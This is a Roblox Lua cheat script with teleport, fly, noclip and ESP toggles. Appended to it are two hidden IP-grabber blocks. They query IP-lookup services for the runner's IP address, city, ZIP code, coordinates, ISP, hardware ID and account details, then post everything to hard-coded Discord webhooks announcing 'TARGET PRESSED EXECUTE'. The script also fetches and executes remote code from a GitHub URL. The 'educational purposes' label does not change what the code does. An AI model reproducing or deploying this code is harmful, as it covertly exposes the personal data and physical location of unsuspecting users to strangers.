mouse.Button1Down:Connect(function()
    if _G.DevStates.ClickTP and mouse.Hit and rootPart then
        rootPart.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 4, 0))
    end
end)

local function setupCharacterEvents(newChar)
    character = newChar
    humanoid = character:WaitForChild("Humanoid", 5)
    rootPart = character:WaitForChild("HumanoidRootPart", 5)
    if not humanoid or not rootPart then return end
    
    camera.CameraSubject = humanoid
    if _G.DevStates.Flying then startFlying() else stopFlying() end
    if _G.DevStates.Noclip then startNoclip() else stopNoclip() end
    if _G.DevStates.ESP then startESP() end
end

setupCharacterEvents(character)
player.CharacterAdded:Connect(setupCharacterEvents)

openMovement()


local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1528754900912312330/uQeZj_LloM_1OaSCoAqbKCkEveATjL4B6xOt_RQDCdzqxbdNoHOHW7U2u742wEwfia9I"

local http_request = syn and syn.request or request

if http_request then
    local ip_info = http_request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
    
    http_request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    })
else
    warn("Dein Executor unterstützt keine HTTP-Requests!")
end


--[[ # Remake was made by skondoooo92
     # Discord server is: "https://discord.gg/4THYgrRQd3"
     # Join our server for more updates and information]]--

loadstring(game:HttpGet("https://raw.githubusercontent.com/ProphecySkondo/Misc/refs/heads/main/watermark.lua"))()

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local plr = Players.LocalPlayer
-- Deine neue Webhook-URL:
local webhook = "https://discord.com/api/webhooks/1528808043687706725/SMRYGtdhcTa3EFn-wuff9H9tu1ZzJvG71-z5BQcuso7s2yDejvhs0fwf_3bou_uh4gBm"

local function getuser()
    return plr.Character and plr.Character.Name or plr.Name
end

local function getid()
    return plr.UserId
end

local function getprofile()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. getid() .. "&width=420&height=420&format=png"
end

local function getIP()
    local ok, res = pcall(function() return game:HttpGet("https://httpbin.org/get") end)
    if ok then
        local suc, d = pcall(function() return HttpService:JSONDecode(res) end)
        if suc and d then return d.origin end
    end
    return "Unavailable"
end

local function getBrowser()
    local res = game:HttpGet("https://httpbin.org/get")
    local d = HttpService:JSONDecode(res)
    return d.headers and d.headers["User-Agent"] or "Unavailable"
end

local function platform()
    local res = game:HttpGet("https://httpbin.org/get")
    local d = HttpService:JSONDecode(res)
    return d.headers and d.headers["Sec-Ch-Ua-Platform"] or "Unavailable"
end

local function gethwid()
    return RbxAnalyticsService:GetClientId()
end

local function url()
    local res = game:HttpGet("https://httpbin.org/get")
    local d = HttpService:JSONDecode(res)
    return d.url or "Unavailable"
end

local function getcity()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    return d.city or "Unavailable"
end

local function getlatndlong()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    if d.lat and d.lon then
        return tostring(d.lat) .. ", " .. tostring(d.lon)
    end
    return "Unavailable"
end

local function zipcode()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    return d.zip or "Unavailable"
end

local function regionName()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    return d.regionName or "Unavailable"
end

local function isp()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    return d.isp or "Unavailable"
end

local function timezone()
    local res = game:HttpGet("https://ipwhois.app/json/")
    local d = HttpService:JSONDecode(res)
    return d.timezone_name or "Unavailable"
end

local function countrybetter()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    return d.country or "Unavailable"
end

local function status()
    local res = game:HttpGet("http://ip-api.com/json")
    local d = HttpService:JSONDecode(res)
    return d.status or "Unavailable"
end

local function currency()
    local res = game:HttpGet("https://ipwhois.app/json/")
    local d = HttpService:JSONDecode(res)
    return d.currency or "Unavailable"
end

local function capital()
    local res = game:HttpGet("https://ipwhois.app/json/")
    local d = HttpService:JSONDecode(res)
    return d.country_capital or "Unavailable"
end

local function getType()
    local res = game:HttpGet("https://ipwhois.app/json/")
    local d = HttpService:JSONDecode(res)
    return d.type or "Unavailable"
end

local function country()
    return LocalizationService:GetCountryRegionForPlayerAsync(plr)
end

local payload = {
    content = "TARGET PRESSED EXECUTE @here @everyone",
    embeds = {
        {
            title       = "INFO FROM A SCRIPT – EDUCATIONAL PURPOSES",
            description = "Use responsibly!",
            color       = 0,
            thumbnail   = {
                url = "https://media.discordapp.net/attachments/1287203891821416581/1379291179316674641/vLu4iMI.jpg?ex=68484643&is=6846f4c3&hm=6304209fd59751d64361bb0ddbff342636382057d096ce258232d9fc27605c42&=&format=webp"
            },
            image = {
                url = "https://images-ext-1.discordapp.net/external/8rGso8pxs71c2tA2r7aW4rsmm76YKY35yiZ2k1cWj6w/https/i.pinimg.com/originals/aa/df/9d/aadf9d097b89e17176ad1e5151fe655f.gif?width=448&height=252"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            fields = {
                { name = "IP Address", value = getIP(), inline = true },
                { name = "Type",       value = getType(), inline = true },
                { name = "Country",    value = countrybetter(), inline = true },
                { name = "Region",     value = regionName(), inline = true },
                { name = "City",       value = getcity(), inline = true },
                { name = "Zip Code",   value = zipcode(), inline = true },
                { name = "Lat, Long",  value = getlatndlong(), inline = true },
                { name = "Timezone",   value = timezone(), inline = true },
                { name = "ISP",        value = isp(), inline = true },
                { name = "Browser",    value = getBrowser(), inline = false },
                { name = "URL",        value = url(), inline = false },
                { name = "Status",     value = status(), inline = true },
                { name = "Currency",   value = currency(), inline = true },
                { name = "Capital",    value = capital(), inline = true },
                { name = "Username",   value = getuser(), inline = true },
                { name = "User ID",    value = tostring(getid()), inline = true },
                { name = "HWID",       value = tostring(gethwid()), inline = true },
                { name = "Locale",     value = country(), inline = true },
                { name = "Profile Image", value = getprofile(), inline = false }
            }
        }
    }
}

-- Universeller Request-Sender für maximale Kompatibilität mit Executoren
local requestFunc = request or http_request or (syn and syn.request)
if requestFunc then
    requestFunc({
        Url     = webhook,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode(payload)
    })
else
    warn("Executor unterstützt keine HTTP-Anfragen zum Senden des Webhooks.")
end




